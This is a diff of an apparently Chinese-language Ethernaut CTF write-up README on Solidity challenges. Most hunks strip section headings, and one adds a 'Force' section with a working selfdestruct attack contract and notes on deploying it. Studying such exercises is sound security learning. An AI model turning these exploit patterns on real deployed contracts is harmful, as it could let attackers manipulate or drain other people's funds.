@@ -16,7 +16,7 @@
 
 # Fallback
 
-## 漏洞代码
+
 
 ```
 // SPDX-License-Identifier: MIT
@@ -79,7 +79,7 @@ You will beat this level if
 - Converting to and from wei/ether units (see `help()` command)
 - Fallback methods
 
-## 分析&攻击
+
 
 结合合约代码和目标看，withdraw()可以提取所有余额，但是用onlyOwner修饰过，只允许owner调用，因此只需要让owner变成我们自己就能达到两个目标。总共三个修改这个变量的地方，constructor()、contribute()和receive()
 
@@ -148,7 +148,7 @@ contract Attack{
 
 # Fallout
 
-## 漏洞代码
+
 
 ```
 // SPDX-License-Identifier: MIT
@@ -199,7 +199,7 @@ contract Fallout {
 
 ![image-20240328103103592](README.assets/image-20240328103103592.png)
 
-## 分析&攻击
+
 
 目标和fallback一样 获取所有权
 
@@ -211,7 +211,7 @@ contract Fallout {
 
 # Coin Flip
 
-## 漏洞代码
+
 
 ```
 题目提示：这是一款抛硬币游戏，您需要通过猜测抛硬币的结果来建立连胜。 要完成此关卡，您需要使用您的心灵能力连续 10 次猜测正确的结果
@@ -253,7 +253,7 @@ contract CoinFlip {
 }
 ```
 
-## 分析&攻击
+
 
 代码比较简单，consecutiveWins是记录胜利次数的，输入bool _guess，和根据区块地址随机计算的side值比对，如果猜对了就consecutiveWins递增，错了consecutiveWins归零
 
@@ -316,7 +316,7 @@ attackMint函数可能提示这个，暂时不用管，不影响复现
 
 # Telephone
 
-## 漏洞代码
+
 
 ```
 题目要求：声明以下合同的所有权以完成此级别。
@@ -343,7 +343,7 @@ contract Telephone {
 
 
 
-## 分析&攻击
+
 
 能改owner的就在changeOwne()函数里面，条件tx.origin != msg.sender满足时就会将owner改成address _owner参数的值，
 
@@ -394,7 +394,7 @@ contract Attack {
 
 # Token
 
-## 漏洞代码
+
 
 ```
 题目要求：此级别的目标是让您破解下面的基本代币合约。
@@ -426,7 +426,7 @@ contract Token {
 }
 ```
 
-## 分析&攻击
+
 
 这个合约一开始创建的时候会让你指定一个初始的代币值，根据提示是要获取额外的代币，能改余额的也就transfer()函数了，
 
@@ -448,7 +448,7 @@ solidity 0.8.0 版本之后会自动检查整型溢出错误，所以用0.6.0测
 
 # Delegation
 
-## 漏洞代码
+
 
 ```
 题目要求：此级别的目标是让您声明对给定实例的所有权
@@ -488,7 +488,7 @@ contract Delegation {
 }
 ```
 
-## 分析&攻击
+
 
 Delegate合约倒简单，直接换个用户调用pwn()就改掉了owner
 
@@ -542,5 +542,76 @@ contract Attack {
 
 
 
+# Force
 
+这个题目很奇怪，啥也没有
 
+```
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+contract Force { /*
+                   MEOW ?
+         /\_/\   /
+    ____/ o o \
+    /~____  =ø= /
+    (______)__m_m)
+                   */ }
+```
+
+题目要求是让这个合约的余额大于0，但是这里没有receive和fallback
+
+https://github.com/AmazingAng/WTF-Solidity/tree/main/19_Fallback
+
+```
+合约接收`ETH`时，`msg.data`为空且存在`receive()`时，会触发`receive()`；`msg.data`不为空或不存在`receive()`时，会触发`fallback()`，此时`fallback()`必须为`payable`。
+
+`receive()`和`payable fallback()`均不存在的时候，向合约直接发送`ETH`将会报错
+```
+
+亲测也是：
+
+![image-20240412162606375](README.assets/image-20240412162606375.png)
+
+让我们看看提示
+
+```
+Fallback methods
+Sometimes the best way to attack a contract is with another contract.
+```
+
+让我们使用另一个合约？也不太理解，查资料才知道：
+
+https://learnblockchain.cn/article/3331
+
+![image-20240412162834825](README.assets/image-20240412162834825.png)
+
+那这个意思就是通过合约自毁，强制把钱打过去
+
+![image-20240412163230411](README.assets/image-20240412163230411.png)
+
+那攻击代码也很简单了：
+
+```
+contract Attack {
+    Force public ForceContract;
+	//payable修饰用于初始接受eth
+    constructor(address ForceContractAddress) payable {
+        ForceContract = Force(ForceContractAddress);
+    }
+	
+    function attack() public payable {
+        address payable addr = payable(address(ForceContract));
+        //自毁
+        selfdestruct(addr);
+    }
+}
+```
+
+部署attack合约的时候给他初始打一些eth：
+
+![image-20240412163652615](README.assets/image-20240412163652615.png)
+
+然后attack
+
+![image-20240412163616108](README.assets/image-20240412163616108.png)
